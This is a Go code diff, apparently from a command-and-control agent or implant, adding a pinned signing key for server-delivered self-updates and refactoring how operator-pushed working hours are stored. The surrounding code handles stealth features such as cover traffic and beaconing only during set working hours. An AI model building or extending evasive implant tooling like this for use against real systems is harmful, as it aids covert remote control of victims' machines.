@@ -25,6 +25,10 @@ type ConfigOverride struct {
 	WorkingTZ    string            `json:"working_tz,omitempty"`
 	CoverTraffic bool              `json:"cover_traffic,omitempty"`
 	CoverTrafficMax int            `json:"cover_traffic_max,omitempty"`
+	// UpdatePubKey pins the self_update signing key (hex ed25519 public).
+	// Delivered over the encrypted session and persisted locally; without it
+	// the agent refuses self_update entirely.
+	UpdatePubKey string `json:"update_pub_key,omitempty"`
 }
 
 var configOverrides struct {
@@ -75,14 +79,18 @@ func handleConfigPush(task Task, res *TaskResult) {
 	if cfg.Method != "" {
 		configOverrides.method = strings.ToUpper(cfg.Method)
 	}
-	if cfg.WorkingStart != "" {
-		workingStart = cfg.WorkingStart
-	}
-	if cfg.WorkingEnd != "" {
-		workingEnd = cfg.WorkingEnd
-	}
-	if cfg.WorkingTZ != "" {
-		workingTZ = cfg.WorkingTZ
+	if cfg.WorkingStart != "" || cfg.WorkingEnd != "" || cfg.WorkingTZ != "" {
+		wh := getWorkingHours()
+		if cfg.WorkingStart != "" {
+			wh.start = cfg.WorkingStart
+		}
+		if cfg.WorkingEnd != "" {
+			wh.end = cfg.WorkingEnd
+		}
+		if cfg.WorkingTZ != "" {
+			wh.tz = cfg.WorkingTZ
+		}
+		setWorkingHours(wh.start, wh.end, wh.tz)
 	}
 	if cfg.CoverTraffic {
 		configOverrides.coverTraffic = true
@@ -90,10 +98,32 @@ func handleConfigPush(task Task, res *TaskResult) {
 	if cfg.CoverTrafficMax > 0 {
 		configOverrides.coverTrafficMax = cfg.CoverTrafficMax
 	}
+	if cfg.UpdatePubKey != "" {
+		key := strings.ToLower(strings.TrimSpace(cfg.UpdatePubKey))
+		if !isHex64(key) {
+			res.Error = "config_push: invalid update_pub_key (want 64 hex chars)"
+			return
+		}
+		updatePinnedPubKeyHex = key
+		persistUpdatePubKey(key)
+	}
 	// Re-derive the typed globals (Interval/Jitter/etc.) from the canonical
 	// string config so the overrides take effect and survive a later reparse.
 	reparseNetworkConfig()
 	res.Output = "config applied"
+}
+
+// isHex64 verifies a 64-character lowercase/uppercase hex string.
+func isHex64(s string) bool {
+	if len(s) != 64 {
+		return false
+	}
+	for _, c := range s {
+		if !(c >= '0' && c <= '9' || c >= 'a' && c <= 'f' || c >= 'A' && c <= 'F') {
+			return false
+		}
+	}
+	return true
 }
 
 func getActiveSleep() int {
@@ -248,14 +278,19 @@ func handleSetWorkingHours(task Task, res *TaskResult) {
 		res.Error = "set_working_hours: invalid json: " + err.Error()
 		return
 	}
-	if cfg.WorkingStart != "" {
-		workingStart = cfg.WorkingStart
+	if cfg.WorkingStart != "" || cfg.WorkingEnd != "" || cfg.WorkingTZ != "" {
+		wh := getWorkingHours()
+		if cfg.WorkingStart != "" {
+			wh.start = cfg.WorkingStart
+		}
+		if cfg.WorkingEnd != "" {
+			wh.end = cfg.WorkingEnd
+		}
+		if cfg.WorkingTZ != "" {
+			wh.tz = cfg.WorkingTZ
+		}
+		setWorkingHours(wh.start, wh.end, wh.tz)
 	}
-	if cfg.WorkingEnd != "" {
-		workingEnd = cfg.WorkingEnd
-	}
-	if cfg.WorkingTZ != "" {
-		workingTZ = cfg.WorkingTZ
-	}
-	res.Output = fmt.Sprintf("working hours set: %s-%s (tz=%s)", workingStart, workingEnd, workingTZ)
+	cur := getWorkingHours()
+	res.Output = fmt.Sprintf("working hours set: %s-%s (tz=%s)", cur.start, cur.end, cur.tz)
 }
